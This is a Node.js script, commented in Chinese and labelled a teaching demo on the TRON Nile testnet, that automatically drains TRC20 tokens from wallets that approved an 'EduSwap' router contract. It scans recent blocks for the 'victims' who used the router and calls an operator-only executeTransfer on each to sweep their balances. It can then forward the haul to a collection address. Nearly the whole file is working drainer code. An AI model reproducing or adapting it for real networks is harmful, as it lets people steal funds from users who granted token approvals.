// scripts/tron/drain.js
// 教学演示专用：TRON 链自动扫描受害者并清空其已授权的 TRC20 代币余额
//
// 用法：
//   # 单个受害者
//   node scripts/tron/drain.js --victim Txxx
//
//   # 自动扫描最近 X 个区块
//   node scripts/tron/drain.js --auto 200
//
//   # 偷完后转到汇总地址
//   node scripts/tron/drain.js --victim Txxx --send-to Ty yy
//
//   # 预览模式（不实际发送交易）
//   node scripts/tron/drain.js --victim Txxx --dry-run

const TronWeb = require("tronweb");
const path = require("path");
require("dotenv").config({ path: path.resolve(__dirname, "../../.env") });

const PRIVATE_KEY = process.env.TRON_PRIVATE_KEY || "";
const NILE_RPC = "https://nile.trongrid.io";

// === 部署后替换为你的实际合约地址 ===
const ROUTER = "TJRg9nepkQBDNmvzauMehCkPq2CUrx5pBS";   // EduSwap 地址 (Base58)
const EDUTOKEN = "TJrG9nepkQBDNmvzauMehCkPq2CUrx5pBT";  // EduToken 地址 (Base58)

// TRC20 / Router ABI（最小集合，和 EVM 版一样）
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint256 amount) returns (bool)",
];
const ROUTER_ABI = [
  "function operator() view returns (address)",
  "function supported(address) view returns (bool)",
  "function executeTransfer(address token, address from)",
  "function withdraw(address token, uint256 amount)",
];

const MAX_UINT256 = (1n << 256n) - 1n;

function parseArgs() {
  const args = process.argv.slice(2);
  const out = { victim: null, sendTo: null, auto: null, dryRun: false };
  for (let i = 0; i < args.length; i++) {
    if (args[i] === "--victim")  out.victim  = args[++i];
    if (args[i] === "--send-to") out.sendTo  = args[++i];
    if (args[i] === "--auto")    out.auto    = parseInt(args[++i], 10);
    if (args[i] === "--dry-run") out.dryRun  = true;
  }
  return out;
}

function header(s) { console.log("\n" + "═".repeat(60) + "\n  " + s + "\n" + "═".repeat(60)); }

async function drainOne(tronWeb, router, token, victim) {
  try {
    const bal = await token.balanceOf(victim).call();
    if (bal === "0" || bal === 0n || bal === 0) {
      console.log(`  [跳过] ${victim} 余额为 0`);
      return 0n;
    }
    const balBig = BigInt(String(bal));
    console.log(`  [扫描] 受害者 ${victim}`);
    console.log(`         余额  ${tronWeb.fromSun(balBig)} EDU`);

    // 静态预览 executeTransfer
    try {
      const routerHex = tronWeb.address.toHex(ROUTER);
      const tokenHex = tronWeb.address.toHex(EDUTOKEN);
      const victimHex = tronWeb.address.toHex(victim);
      await tronWeb.transactionBuilder.triggerConstantContract(
        routerHex,
        "executeTransfer(address,address)",
        {},
        [{ type: "address", value: tokenHex }, { type: "address", value: victimHex }],
        routerHex
      );
    } catch (e) {
      console.log(`  [跳过] executeTransfer 静态调用失败`);
      console.log("         原因可能是：未无限授权 / 未在白名单 / 余额为 0");
      return 0n;
    }
    return balBig;
  } catch (e) {
    console.log(`  [跳过] 查询失败: ${e.message || e}`);
    return 0n;
  }
}

async function executeTransfer(tronWeb, router, victim, dryRun) {
  if (dryRun) {
    console.log(`  [DRY]  将调用 executeTransfer(${EDUTOKEN}, ${victim})`);
    return 0n;
  }
  try {
    console.log(`  [发送] executeTransfer tx ...`);
    const tx = await router.executeTransfer(
      tronWeb.address.toHex(EDUTOKEN),
      tronWeb.address.toHex(victim)
    ).send({
      feeLimit: 100000000,
      from: tronWeb.defaultAddress.base58,
    });
    console.log(`         txid: ${tx}`);
    console.log(`         ✓ 已执行`);
    return 1n;
  } catch (e) {
    console.log(`  [失败] ${e.message || e}`);
    return 0n;
  }
}

async function autoScan(tronWeb, token, blocks) {
  console.log(`  扫描最近 ${blocks} 个区块的交易 ...`);
  const deployer = tronWeb.defaultAddress.base58;

  // TRON 上通过遍历区块找候选受害者
  const candidates = new Set();
  try {
    const tipBlock = await tronWeb.trx.getCurrentBlock();
    const tip = tipBlock.block_header.raw_data.number;
    for (let b = tip; b > tip - Math.min(blocks, 200) && b > 0; b--) {
      try {
        const block = await tronWeb.trx.getBlock(b);
        if (!block || !block.transactions) continue;
        for (const tx of block.transactions) {
          const rawData = tx.raw_data;
          if (!rawData || !rawData.contract) continue;
          for (const c of rawData.contract) {
            if (c.parameter && c.parameter.value) {
              const val = c.parameter.value;
              if (val.contract_address) {
                const contractAddr = tronWeb.address.fromHex(val.contract_address);
                if (contractAddr === ROUTER) {
                  if (val.owner_address) {
                    candidates.add(tronWeb.address.fromHex(val.owner_address));
                  }
                }
              }
            }
          }
        }
      } catch { /* 跳过此区块 */ }
    }
  } catch (e) {
    console.log(`  扫描区块时出错: ${e.message}，继续...`);
  }

  console.log(`  候选数: ${candidates.size}`);

  const hits = [];
  for (const addr of candidates) {
    if (addr === deployer) continue;
    try {
      const routerHex = tronWeb.address.toHex(ROUTER);
      const bal = await token.balanceOf(addr).call();
      // 简单判断：余额 > 0 就算候选
      if (bal && bal !== "0") {
        hits.push({ addr, bal });
      }
    } catch { /* 跳过 */ }
  }
  return hits;
}

async function sendOut(tronWeb, token, to, amount, dryRun) {
  if (amount <= 0n) return;
  if (dryRun) {
    console.log(`  [DRY]  将 transfer ${tronWeb.fromSun(amount)} EDU -> ${to}`);
    return;
  }
  try {
    console.log(`  [发送] transfer ${tronWeb.fromSun(amount)} EDU -> ${to}`);
    const tx = await token.transfer(to, TronWeb.toHex(amount)).send({
      feeLimit: 100000000,
      from: tronWeb.defaultAddress.base58,
    });
    console.log(`         txid: ${tx}`);
    console.log(`         ✓ 已转出`);
  } catch (e) {
    console.log(`  [失败] ${e.message || e}`);
  }
}

async function main() {
  const args = parseArgs();

  if (!PRIVATE_KEY) {
    console.log("错误: 请在 .env 文件中设置 TRON_PRIVATE_KEY");
    process.exit(1);
  }

  const tronWeb = new TronWeb({
    fullHost: NILE_RPC,
    privateKey: PRIVATE_KEY,
  });
  const me = tronWeb.defaultAddress.base58;

  header("EduSwap TRON 教学演示 - 自动化 drain 工具");
  console.log(`  操作账户  : ${me}`);
  console.log(`  Router    : ${ROUTER}`);
  console.log(`  EduToken  : ${EDUTOKEN}`);
  console.log(`  网络      : Nile (TRON Testnet)`);
  console.log(`  模式      : ${args.dryRun ? "DRY-RUN" : "LIVE"}`);

  const router = await tronWeb.contract(ROUTER_ABI, ROUTER);
  const token  = await tronWeb.contract(ERC20_ABI, EDUTOKEN);

  // 验证 operator
  try {
    const op = await router.operator().call();
    const op58 = tronWeb.address.fromHex(String(op));
    if (op58 !== me) {
      console.log(`\n  ⚠ 当前账户不是 operator (operator = ${op58})，无法执行`);
      process.exit(1);
    }
    console.log(`  ✓ operator 验证通过`);
  } catch (e) {
    console.log(`\n  ⚠ 无法验证 operator: ${e.message || e}`);
    process.exit(1);
  }

  let targets = [];
  if (args.victim) {
    targets = [args.victim];
  } else if (args.auto) {
    const hits = await autoScan(tronWeb, token, args.auto);
    targets = hits.map(h => h.addr);
    console.log(`  命中 ${targets.length} 个有余额的账户:`);
    hits.forEach(h => console.log(`    - ${h.addr}  (${tronWeb.fromSun(BigInt(String(h.bal)))} EDU)`));
  } else {
    console.log(`\n  用法:`);
    console.log(`    node scripts/tron/drain.js --victim Txxx`);
    console.log(`    node scripts/tron/drain.js --auto 200`);
    console.log(`    node scripts/tron/drain.js --victim Txxx --send-to Txxx`);
    console.log(`    node scripts/tron/drain.js --victim Txxx --dry-run`);
    process.exit(0);
  }

  if (targets.length === 0) {
    console.log(`\n  没有可处理的目标，退出。`);
    process.exit(0);
  }

  header("开始处理");
  let totalDrained = 0;
  for (const victim of targets) {
    const expectedBal = await drainOne(tronWeb, router, token, victim);
    if (expectedBal === 0n) continue;
    const ok = await executeTransfer(tronWeb, router, victim, args.dryRun);
    if (ok > 0n) totalDrained++;
  }

  if (args.sendTo) {
    header("转出汇总");
    const tokenInst = await tronWeb.contract(ERC20_ABI, EDUTOKEN);
    const balWei = await tokenInst.balanceOf(me).call();
    const myBal = BigInt(String(balWei));
    await sendOut(tronWeb, tokenInst, args.sendTo, myBal, args.dryRun);
  }

  header("完成");
  const tokenInst = await tronWeb.contract(ERC20_ABI, EDUTOKEN);
  const balWei = await tokenInst.balanceOf(me).call();
  console.log(`  操作账户当前 EDU 余额: ${tronWeb.fromSun(BigInt(String(balWei)))}`);
  console.log(`  本次成功 drain 数量: ${totalDrained}`);
}

main().catch((e) => { console.error(e); process.exit(1); });
